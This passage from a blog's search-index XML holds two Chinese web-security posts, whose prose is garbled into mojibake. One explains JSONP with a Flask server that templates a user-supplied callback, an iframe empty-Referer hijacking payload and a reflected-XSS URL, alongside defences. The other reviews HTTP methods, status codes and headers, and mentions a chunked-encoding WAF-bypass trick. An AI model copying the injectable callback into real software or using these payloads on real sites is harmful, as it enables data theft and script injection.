class="line">        dict(username=<span class="string">"lisi"</span>,stat=<span class="string">"working"</span>),</span><br><span class="line">        dict(username=<span class="string">"wangwu"</span>,stat=<span class="string">"student"</span>),</span><br><span class="line">    ]</span><br><span class="line">    callback=request.args.get(<span class="string">"callback"</span>)</span><br><span class="line">    json_data=json.dumps(user[_id])</span><br><span class="line">    template=<span class="string">"&#123;&#123;callback&#125;&#125;(&#123;&#123;json_data&#125;&#125;)"</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(template, callback=callback, json_data=json_data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">'127.0.0.1'</span>, port=<span class="number">8888</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>è¿™æ ·ï¼ŒåŠ å…¥æˆ‘ä»¬è®¿é—®<a href="http://127.0.0.1:8888/remote.js?id=1&amp;callback=mycallbackï¼Œé‚£ä¹ˆä¼šå¾—åˆ°å¦‚ä¸‹ç»“æœï¼š" target="_blank" rel="noopener">http://127.0.0.1:8888/remote.js?id=1&amp;callback=mycallbackï¼Œé‚£ä¹ˆä¼šå¾—åˆ°å¦‚ä¸‹ç»“æœï¼š</a></p><p><img src="/jsonp-JSONPåŸç†åŠå…¶å®‰å…¨æ€§é—®é¢˜/1549265659864.png" alt="1549265659864"></p><h3 id="å‰å°"><a href="#å‰å°" class="headerlink" title="å‰å°"></a>å‰å°</h3><p>é‚£ä¹ˆå‰ç«¯å°±å¯ä»¥åµŒå…¥ä¸€ä¸ª<code>&lt;script&gt;</code>æ ‡ç­¾ï¼Œå…¶ä¸­<code>src</code>è®¾ç½®ä¸º<a href="http://127.0.0.1:8888/remote.js?id=1&amp;callback=mycallbackï¼Œä»¥æ­¤è·å–æ•°æ®ï¼š" target="_blank" rel="noopener">http://127.0.0.1:8888/remote.js?id=1&amp;callback=mycallbackï¼Œä»¥æ­¤è·å–æ•°æ®ï¼š</a></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/1999/xhtml"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="comment">// å¾—åˆ°æŸ¥è¯¢ç»“æœåçš„å›è°ƒå‡½æ•°</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> mycallback = <span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        alert(<span class="string">'username: '</span> + data.username + <span class="string">', status: '</span>+ data.stat);</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- æä¾›jsonpæœåŠ¡çš„urlåœ°å€ï¼ˆä¸ç®¡æ˜¯ä»€ä¹ˆç±»å‹çš„åœ°å€ï¼Œæœ€ç»ˆç”Ÿæˆçš„è¿”å›å€¼éƒ½æ˜¯ä¸€æ®µjavascriptä»£ç ï¼‰ --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://127.0.0.1:8888/remote.js?id=1&amp;callback=mycallback"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è·å–æ•°æ®æˆåŠŸï¼š</p><p><img src="/jsonp-JSONPåŸç†åŠå…¶å®‰å…¨æ€§é—®é¢˜/1549266866289.png" alt="1549266866289"></p><p>åŒæ—¶ç»™å‡ºjQueryçš„ç‰ˆæœ¬ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        type: <span class="string">"get"</span>,</span><br><span class="line">        <span class="keyword">async</span>: <span class="literal">false</span>,</span><br><span class="line">        url: <span class="string">"http://127.0.0.1:8888/remote.js?id=1"</span>,</span><br><span class="line">        dataType: <span class="string">"jsonp"</span>,</span><br><span class="line">        jsonp: <span class="string">"callback"</span>,<span class="comment">//ä¼ é€’ç»™è¯·æ±‚å¤„ç†ç¨‹åºæˆ–é¡µé¢çš„ï¼Œç”¨ä»¥è·å¾—jsonpå›è°ƒå‡½æ•°åçš„å‚æ•°å(ä¸€èˆ¬é»˜è®¤ä¸º:callback)</span></span><br><span class="line">        jsonpCallback:<span class="string">"mycallback"</span>,<span class="comment">//è‡ªå®šä¹‰çš„jsonpå›è°ƒå‡½æ•°åç§°ï¼Œé»˜è®¤ä¸ºjQueryè‡ªåŠ¨ç”Ÿæˆçš„éšæœºå‡½æ•°åï¼Œä¹Ÿå¯ä»¥å†™"?"ï¼ŒjQueryä¼šè‡ªåŠ¨ä¸ºä½ å¤„ç†æ•°æ®</span></span><br><span class="line">        success: <span class="function"><span class="keyword">function</span>(<span class="params">json</span>)</span>&#123;</span><br><span class="line">            alert(<span class="string">'username: '</span> + data.username + <span class="string">', status: '</span>+ data.stat);</span><br><span class="line">        &#125;,</span><br><span class="line">        error: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            alert(<span class="string">'fail'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h1 id="JSONPçš„å®‰å…¨æ€§é—®é¢˜"><a href="#JSONPçš„å®‰å…¨æ€§é—®é¢˜" class="headerlink" title="JSONPçš„å®‰å…¨æ€§é—®é¢˜"></a>JSONPçš„å®‰å…¨æ€§é—®é¢˜</h1><h2 id="JSONåŠ«æŒå¯¼è‡´CSRF"><a href="#JSONåŠ«æŒå¯¼è‡´CSRF" class="headerlink" title="JSONåŠ«æŒå¯¼è‡´CSRF"></a>JSONåŠ«æŒå¯¼è‡´CSRF</h2><p>ä¸»è¦è¡¨ç°ä¸ºåå°æ²¡æœ‰åšèº«ä»½è®¤è¯ï¼Œå¯¼è‡´ä»»ä½•å‰å°éƒ½å¯ä»¥å‘é€JSONPè¯·æ±‚ï¼Œè‹¥è¯·æ±‚ä¸­å­˜åœ¨æ•æ„Ÿä¿¡æ¯åˆ™ä¼šå‘ç”Ÿä¿¡æ¯æ³„éœ²ï¼ˆç›¸å½“äºCSRFï¼‰ã€‚</p><h3 id="é˜²å¾¡æ–¹æ³•"><a href="#é˜²å¾¡æ–¹æ³•" class="headerlink" title="é˜²å¾¡æ–¹æ³•"></a>é˜²å¾¡æ–¹æ³•</h3><ol><li>ä½¿ç”¨refererè¿‡æ»¤ï¼Œå¯¹äºç©ºrefererä¸äºˆä»¥æ”¾è¡Œ</li><li>å¢åŠ ä¸€ä¸ªéšæœºtoken</li></ol><p>å¯ä»¥çœ‹åˆ°æ•´ä½“çš„é˜²å¾¡æ–¹æ³•ç±»ä¼¼äºCSRFçš„é˜²å¾¡æ–¹æ³•ã€‚</p><h3 id="ç©ºreferer"><a href="#ç©ºreferer" class="headerlink" title="ç©ºreferer"></a>ç©ºreferer</h3><p>è¿›è¡ŒåŸºäºrefererçš„é˜²å¾¡æ—¶ï¼Œå¯¹äºç©ºrefererçš„æƒ…å†µåº”ä¸äºˆä»¥æ”¾è¡Œï¼Œå› ä¸ºæ”»å‡»è€…å¯ä»¥ä½¿ç”¨æŸäº›æ ‡ç­¾ï¼ˆ<code>iframe</code>ï¼‰æ„é€ ç©ºrefererã€‚Payloadå¦‚ä¸‹ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"javascript:'&lt;script&gt;function callback(o)&#123;alert(o.username);&#125;&lt;/script&gt;&lt;script src=http://127.0.0.1:8888/remote.js?id=1&amp;callback=callback&gt;&lt;/script&gt;'"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="è‡ªå®šä¹‰Callbackå¯¼è‡´XSS"><a href="#è‡ªå®šä¹‰Callbackå¯¼è‡´XSS" class="headerlink" title="è‡ªå®šä¹‰Callbackå¯¼è‡´XSS"></a>è‡ªå®šä¹‰Callbackå¯¼è‡´XSS</h2><p>æ¯”å¦‚è¯´æœ¬æ–‡çš„å®ä¾‹ï¼Œæ”»å‡»è€…å¯ä»¥æ„é€ å¦‚ä¸‹é“¾æ¥å¯¼è‡´åå°„å‹XSSï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8888/remote.js?id=1&amp;callback=&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="é˜²å¾¡æ–¹æ³•-1"><a href="#é˜²å¾¡æ–¹æ³•-1" class="headerlink" title="é˜²å¾¡æ–¹æ³•"></a>é˜²å¾¡æ–¹æ³•</h3><ul><li>å®šä¹‰Content-Type: application/json</li><li>å¯¹XSSå­—ç¬¦è¿›è¡Œèƒ½è¿‡æ»¤</li></ul>]]></content>
      
      
      <categories>
          
          <category> Webå®‰å…¨-JSONP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javascript </tag>
            
            <tag> åŒæº </tag>
            
            <tag> JSONP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTTPåè®®å¤ä¹ </title>
      <link href="/HTTP-HTTP%E5%8D%8F%E8%AE%AE%E5%A4%8D%E4%B9%A0/"/>
      <url>/HTTP-HTTP%E5%8D%8F%E8%AE%AE%E5%A4%8D%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="HTTP-è¯·æ±‚"><a href="#HTTP-è¯·æ±‚" class="headerlink" title="HTTP è¯·æ±‚"></a>HTTP è¯·æ±‚</h1><ul><li><p>GET ç”¨äºè·å–æ•°æ®<del>ï¼Œæ— è¯·æ±‚body</del></p></li><li><p>POST ç”¨äºæ·»åŠ æ•°æ®</p><p>å…¶content-typeä¸åŒï¼Œbodyä¸­çš„æ ¼å¼ä¹Ÿä¸åŒ</p></li><li><p>PUT ç”¨äºæ·»åŠ æˆ–æ›´æ–°æ•°æ®</p><p>Request:</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">PUT</span> <span class="string">/new.html</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: example.com</span><br><span class="line"><span class="attribute">Content-type</span>: text/html</span><br><span class="line"><span class="attribute">Content-length</span>: 16</span><br><span class="line"></span><br><span class="line">&lt;p&gt;New File&lt;/p&gt;</span><br></pre></td></tr></table></figure><p>Response:</p><p>è‹¥èµ„æºä¸å­˜åœ¨éœ€è¦åˆ›å»ºï¼Œé‚£ä¹ˆæœåŠ¡å™¨éœ€å“åº”<code>201</code>è¡¨æ˜å†…å®¹å·²åˆ›å»ºï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">201</span> Created</span><br><span class="line"><span class="attribute">Content-Location</span>: /new.html</span><br></pre></td></tr></table></figure><p>è‹¥èµ„æºå­˜åœ¨åˆ™è¿”å›<code>200</code>æˆ–<code>204</code>:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">204</span> No Content</span><br><span class="line"><span class="attribute">Content-Location</span>: /existing.html</span><br></pre></td></tr></table></figure></li><li><p>PATCH ç”¨äºæ›´æ–°æ•°æ®</p><p>Request:</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PATCH /file.html HTTP/1.1 </span><br><span class="line"><span class="attribute">Host</span>: www.example.com</span><br><span class="line"><span class="attribute">Content-Type</span>: application/example</span><br><span class="line"><span class="attribute">If-Match</span>: "e0023aa4e"</span><br><span class="line"><span class="attribute">Content-Length</span>: 100</span><br><span class="line"></span><br><span class="line">&#123;"op":"move", "from":"/a/b/c", "to":"/a/b/d"&#125;</span><br></pre></td></tr></table></figure><p>Response:</p><p>æ­£ç¡®å›åº”åº”è¯¥ä¸º<code>204</code>å› ä¸º<code>200</code>ä¼šå¸¦è¿”å›body</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">204</span> No Content</span><br><span class="line"><span class="attribute">Content-Location</span>: /file.txt</span><br><span class="line"><span class="attribute">ETag</span>: "e0023aa4f"</span><br></pre></td></tr></table></figure></li><li><p>DELETE ç”¨äºåˆ é™¤æ•°æ®</p><p>Requestï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="string">/file.html</span> HTTP/1.1</span><br></pre></td></tr></table></figure><p>Response:</p><p><code>202</code>å·²ç»æ¥å—ä½†æ“ä½œæœªæ‰§è¡Œå®Œï¼Œ<code>204</code>æˆ–è€…<code>200</code>(éœ€è¿”å›body)</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK </span><br><span class="line">Date: Wed, 21 Oct 2015 07:28:00 GMT</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>File deleted.<span class="tag">&lt;/<span class="name">h1</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>HEAD ç”¨äºè·å–GETè¯·æ±‚çš„å“åº”å¤´<del>ï¼Œæ— è¯·æ±‚body</del></p></li><li><p>OPTIONS ç”¨äºæè¿°é€šä¿¡é€‰é¡¹ï¼Œå¦‚CORSä½¿ç”¨æˆ–è€…è·å–æœåŠ¡å™¨æ‰€æ”¯æŒçš„æ–¹æ³•</p></li><li><p>TRACE å›æ˜¾æœåŠ¡å™¨æ”¶åˆ°çš„è¯·æ±‚</p></li></ul><a id="more"></a><p><strong>19/08/28æ›´æ–°ï¼š</strong>ç»è¿‡å¤§ä½¬çº æ­£ï¼Œ<a href="https://tools.ietf.org/html/rfc7230" target="_blank" rel="noopener">RFC7230</a>3.3èŠ‚æ˜ç¡®æŒ‡å‡ºä»»ä½•è¯·æ±‚éƒ½å¯ä»¥å¸¦bodyï¼Œè€Œdeveloper.mozillaé‚£è¾¹å†™é”™äº†ã€‚</p><h2 id="å¯¹æ¯”"><a href="#å¯¹æ¯”" class="headerlink" title="å¯¹æ¯”"></a>å¯¹æ¯”</h2><p>å¹‚ç­‰æ€§ï¼šä¸è®ºè¿›è¡Œå¤šå°‘æ¬¡æ“ä½œï¼Œéƒ½è¿”å›ç›¸åŒçš„ç»“æœã€‚</p><p>å®‰å…¨æ€§ï¼ˆSafeï¼‰ï¼šæ–¹æ³•ä¸æ”¹å˜èµ„æºï¼Œå¯ä»¥ç†è§£ä¸ºåªè¯»æ€§ã€‚</p><div class="table-container"><table><thead><tr><th></th><th>GET</th><th>POST</th><th>PUT</th><th>PATCH</th><th>DELETE</th><th>HEAD</th><th>OPTIONS</th><th>TRACE</th></tr></thead><tbody><tr><td>è¯·æ±‚å«body</td><td>N</td><td>Y</td><td>Y</td><td>Y</td><td>May</td><td>N</td><td>N</td><td>N</td></tr><tr><td>å›åº”å«body</td><td>Y</td><td>Y</td><td>N</td><td>Y</td><td>May</td><td>N</td><td>Y</td><td>N</td></tr><tr><td>å®‰å…¨æ€§</td><td>Y</td><td>N</td><td>N</td><td>N</td><td>N</td><td>Y</td><td>Y</td><td>N</td></tr><tr><td>å¹‚ç­‰æ€§</td><td>Y</td><td>N</td><td>Y</td><td>May</td><td>Y</td><td>Y</td><td>Y</td><td>N</td></tr><tr><td>å¯ç¼“å­˜</td><td>Y</td><td>Y</td><td>N</td><td>N</td><td>N</td><td>Y</td><td>N</td><td>N</td></tr><tr><td>å¯ä»¥è¢«è¡¨å•ä½¿ç”¨</td><td>Y</td><td>Y</td><td>N</td><td>N</td><td>N</td><td>N</td><td>N</td><td>N</td></tr></tbody></table></div><h2 id="POSTã€PUTå’ŒPATCHçš„åŒºåˆ«"><a href="#POSTã€PUTå’ŒPATCHçš„åŒºåˆ«" class="headerlink" title="POSTã€PUTå’ŒPATCHçš„åŒºåˆ«"></a>POSTã€PUTå’ŒPATCHçš„åŒºåˆ«</h2><p>ç”¨æ³•åŒºåˆ«ï¼š</p><ul><li>POSTç”¨äºåˆ›å»ºèµ„æº</li><li>PUTç”¨äºåˆ›å»ºæˆ–æ›´æ–°èµ„æº</li><li>PATCHç”¨äºæ›´æ–°èµ„æºï¼ˆä¸PUTä¸åŒçš„æ˜¯PATCHçš„bodyéƒ¨åˆ†å¿…é¡»åŒ…å«<strong>å¯¹è±¡éœ€è¦æ›´æ–°çš„å±æ€§æ–°çš„å€¼</strong>å¹¶ä¸”å¯èƒ½åŒ…å«<strong>æ—§çš„å€¼</strong>ï¼Œè€ŒPUTéœ€è¦åŒ…å«<strong>å¯¹è±¡çš„æ‰€æœ‰å¿…é¡»(åŒ…æ‹¬æ–°çš„å’Œæ—§çš„)å±æ€§</strong>ï¼‰æ³¨æ„è¿™å†³å®šäº†PATCHä¸èƒ½ä¿è¯å¹‚ç­‰æ€§ï¼Œä¸‹æ–‡ä¼šè¯¦ç»†è®¨è®ºã€‚</li></ul><p>å¹‚ç­‰æ€§åŒºåˆ«ï¼š</p><ul><li>POSTæ˜¯ä¸å¹‚ç­‰çš„ï¼Œä¾‹å¦‚<code>POST /api/create/user/a</code>ä¸ºåˆ›å»ºä¸€ä¸ªç”¨æˆ·aï¼Œå†æ¬¡POSTåˆ™å¯¹å†æ¬¡åˆ›å»ºï¼ˆå³ä½¿å…ˆå‰å­˜åœ¨ä¸€ä¸ªé‡å¤æ•°æ®ï¼‰ã€‚</li><li><p>PUTæ˜¯å¹‚ç­‰çš„ï¼Œå³å­˜åœ¨åˆ™æ›´æ–°ï¼Œä¸å­˜åœ¨åˆ™åˆ›å»ºã€‚</p></li><li><p>PATCHçš„è®¾è®¡æœ‰å¯èƒ½å¹‚ç­‰â€”â€”bodyéƒ¨åˆ†åªåŒ…å«æ›´æ–°åçš„å€¼ï¼Œæ¯”å¦‚ï¼ˆ<code>{&quot;name&quot;:&quot;newname&quot;}</code>)ï¼Œä¹Ÿæœ‰å¯èƒ½æ˜¯ä¸å¹‚ç­‰çš„â€”â€”bodyéƒ¨åˆ†åŒ…å«äº†æ›´æ–°å‰çš„å€¼å’Œæ›´æ–°åçš„å€¼ï¼Œæ¯”å¦‚ï¼ˆ<code>{&quot;op&quot;:&quot;rename&quot;,&quot;oldname&quot;:&quot;Old&quot;ï¼Œâ€newname&quot;,&quot;New&quot;}</code>ï¼‰ç¬¬äºŒæ¬¡æ‰§è¡Œæ—¶ï¼Œå› ä¸ºoldnameå·²ç»ä¸ä¸ºâ€Oldâ€œï¼Œæ‰€ä»¥ä¼šæŠ›å‡ºå¼‚å¸¸ã€‚</p></li></ul><p>å½“ç„¶è¿™åªæ˜¯è§„èŒƒçš„è®¾è®¡ï¼Œåœ¨å®é™…åº”ç”¨ä¸­ï¼Œç”±äºå¼€å‘è€…ç´ è´¨å’Œä¸šåŠ¡åœºæ™¯çš„ä¸åŒï¼Œå¾ˆå¯èƒ½æ‰“ç ´è¿™äº›è¯·æ±‚çš„åŸæœ‰åŠŸèƒ½ï¼Œæ¯”å¦‚å¾ˆå¤šæƒ…å†µä¸‹ç”¨POSTä»£æ›¿äº†PUTå’ŒPATCHã€‚</p><h1 id="å“åº”ç "><a href="#å“åº”ç " class="headerlink" title="å“åº”ç "></a>å“åº”ç </h1><p>åªåˆ—ä¸¾å¸¸ç”¨çš„</p><h2 id="ä¿¡æ¯å“åº”"><a href="#ä¿¡æ¯å“åº”" class="headerlink" title="ä¿¡æ¯å“åº”"></a>ä¿¡æ¯å“åº”</h2><p><code>101 switching Protocol</code></p><p>æœåŠ¡å™¨å°†ç”¨Upgradeé€šçŸ¥å®¢æˆ·ç«¯é‡‡ç”¨ä¸åŒåè®®å®Œæˆè¿™ä¸ªè¯·æ±‚</p><h2 id="æˆåŠŸ"><a href="#æˆåŠŸ" class="headerlink" title="æˆåŠŸ"></a>æˆåŠŸ</h2><p><code>200 OK</code></p><p>è¯·æ±‚æˆåŠŸ</p><h2 id="é‡å®šå‘"><a href="#é‡å®šå‘" class="headerlink" title="é‡å®šå‘"></a>é‡å®šå‘</h2><p><code>301 Moved Permanently</code></p><p>æ°¸ä¹…é‡å®šå‘</p><p><code>302 Found</code></p><p>è¯·æ±‚çš„èµ„æºç°åœ¨ä¸´æ—¶ä»ä¸åŒçš„ URI å“åº”è¯·æ±‚ã€‚</p><h2 id="å®¢æˆ·ç«¯é—®é¢˜"><a href="#å®¢æˆ·ç«¯é—®é¢˜" class="headerlink" title="å®¢æˆ·ç«¯é—®é¢˜"></a>å®¢æˆ·ç«¯é—®é¢˜</h2><p><code>400 Bad Request</code></p><p>è¯­æ„æœ‰é”™è¯¯æˆ–è¯·æ±‚å‚æ•°æœ‰è¯¯</p><p><code>401 Unauthorized</code></p><p>å½“å‰è¯·æ±‚éœ€è¦ç”¨æˆ·éªŒè¯</p><p><code>403 Forbidden</code></p><p>æœåŠ¡å™¨å·²ç»ç†è§£è¯·æ±‚ï¼Œä½†æ˜¯æ‹’ç»æ‰§è¡Œå®ƒã€‚ä¸ 401 å“åº”ä¸åŒçš„æ˜¯ï¼Œèº«ä»½éªŒè¯å¹¶ä¸èƒ½æä¾›ä»»ä½•å¸®åŠ©ï¼Œè€Œä¸”è¿™ä¸ªè¯·æ±‚ä¹Ÿä¸åº”è¯¥è¢«é‡å¤æäº¤ã€‚</p><p><code>404 Not Found</code></p><p>è¯·æ±‚å¤±è´¥ï¼Œè¯·æ±‚æ‰€å¸Œæœ›å¾—åˆ°çš„èµ„æºæœªè¢«åœ¨æœåŠ¡å™¨ä¸Šå‘ç°ã€‚</p><p><code>408 Request Timeout</code></p><p>è¯·æ±‚è¶…æ—¶</p><h2 id="æœåŠ¡å™¨é”™è¯¯"><a href="#æœåŠ¡å™¨é”™è¯¯" class="headerlink" title="æœåŠ¡å™¨é”™è¯¯"></a>æœåŠ¡å™¨é”™è¯¯</h2><p><code>500 Internal Server Error</code></p><p>æœåŠ¡å™¨é‡åˆ°äº†ä¸çŸ¥é“å¦‚ä½•å¤„ç†çš„æƒ…å†µ</p><p><code>502 Bad Gateway</code></p><p>ä¸Šæ¸¸æœåŠ¡å™¨ï¼ˆå¦‚tomcatã€php-fpmï¼‰çš„å“åº”æ˜¯æ— æ•ˆçš„</p><p><code>503 Service Unavailable</code></p><p>æœåŠ¡å™¨æ²¡æœ‰å‡†å¤‡å¥½å¤„ç†è¯·æ±‚ã€‚ å¸¸è§åŸå› æ˜¯æœåŠ¡å™¨å› ç»´æŠ¤æˆ–é‡è½½è€Œåœæœº</p><p><code>504 Gateway Timeout</code></p><p>å½“æœåŠ¡å™¨ä½œä¸ºç½‘å…³ï¼Œä¸èƒ½åŠæ—¶å¾—åˆ°å“åº”æ—¶è¿”å›æ­¤é”™è¯¯ä»£ç ã€‚</p><h1 id="HTTP-é¦–éƒ¨"><a href="#HTTP-é¦–éƒ¨" class="headerlink" title="HTTP é¦–éƒ¨"></a>HTTP é¦–éƒ¨</h1><p>HTTPçš„é¦–éƒ¨è¯´ä¸å®Œï¼Œåªåˆ—ä¸¾ä¸å®‰å…¨æœ‰å…³çš„ï¼Œå€¼å¾—æ³¨æ„çš„æ˜¯<code>x-</code>å¼€å¤´çš„å¤´éƒ¨ä¸ºè‡ªå®šä¹‰å¤´éƒ¨ï¼Œè¿™åœ¨2012å¹´6æœˆå·²ç»è¢«RFCåºŸæ­¢ã€‚</p><h2 id="Host"><a href="#Host" class="headerlink" title="Host"></a>Host</h2><p>ç”¨äºä¸åŒåŸŸåé…ç½®åœ¨åŒä¸€ä¸ªIPåœ°å€çš„æœåŠ¡å™¨ä¸Šï¼Œwebå®¹å™¨ï¼ˆå¦‚nginxï¼‰é€šè¿‡è¯¥å­—æ®µè½¬å‘è¯·æ±‚ã€‚</p><h2 id="Content-Length"><a href="#Content-Length" class="headerlink" title="Content-Length"></a>Content-Length</h2><p>å¯¹äºæŒç»­è¿æ¥æ¥è¯´ï¼Œä½¿ç”¨Content-Lenghtæ¥å®šä¹‰httpæŠ¥æ–‡è¾¹ç•Œã€‚</p><h2 id="Transfer-Encoding-chunked"><a href="#Transfer-Encoding-chunked" class="headerlink" title="Transfer-Encoding: chunked"></a>Transfer-Encoding: chunked</h2><p>åˆ†å—ä¼ è¾“ï¼Œå°†æŠ¥æ–‡åˆ†å—å‘é€ï¼Œè¿™æ ·å‘é€æ–¹ä¸éœ€è¦ä¸€æ¬¡æ€§è®¡ç®—httpé•¿åº¦ã€‚</p><p>æ¯ä¸ªåˆ†å—åŒ…å«ä¸€ä¸ªåå…­è¿›åˆ¶æ•°æ®è¡¨ç¤ºæ•°æ®é•¿åº¦å’Œæ•°æ®éƒ¨åˆ†ï¼Œç”¨CLRF(\r\n)ç»“å°¾ï¼›æœ€åä¸€ä¸ªåˆ†å—é•¿åº¦ä¸º0è¡¨ç¤ºç»“æŸï¼›<code>;</code>è¡¨ç¤ºæ³¨é‡Šï¼Œå¯ä»¥ç”¨æ¥ç»•è¿‡WAF</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Content-Type</span>: text/plain</span><br><span class="line"><span class="attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="attribute">25\r\n</span></span><br><span class="line">This is the data in the first chunk\r\n</span><br><span class="line"></span><br><span class="line"><span class="attribute">1C\r\n</span></span><br><span class="line">and this is the second one\r\n</span><br><span class="line"></span><br><span class="line"><span class="attribute">3;xxxx\r\n</span></span><br><span class="line"><span class="attribute">con\r\n</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line"><span class="attribute">8\r\n</span></span><br><span class="line"><span class="attribute">sequence\r\n</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line"><span class="attribute">0\r\n</span></span><br><span class="line"><span class="attribute">\r\n</span></span><br><span class="line"><span class="attribute">(ä¸¤ä¸ªæ¢è¡Œ)</span></span><br></pre></td></tr></table></figure><h2 id="X-Frame-Options"><a href="#X-Frame-Options" class="headerlink" title="X-Frame-Options"></a>X-Frame-Options</h2><p>ç”¨äºé˜²å¾¡UIç‚¹å‡»åŠ«æŒï¼Œå®ƒæ˜¯æŒ‡æ”»å‡»è€…æ”¹é€ ç½‘é¡µï¼Œåœ¨ç½‘é¡µå‰åŠ å…¥ä¸€ä¸ªé€æ˜çš„iframeæ¡†è¯±æƒ‘æ”»å‡»è€…ç‚¹å‡»ï¼Œæ ¼å¼ä¸ºï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Frame-Options: DENY | SAMEORIGIN | 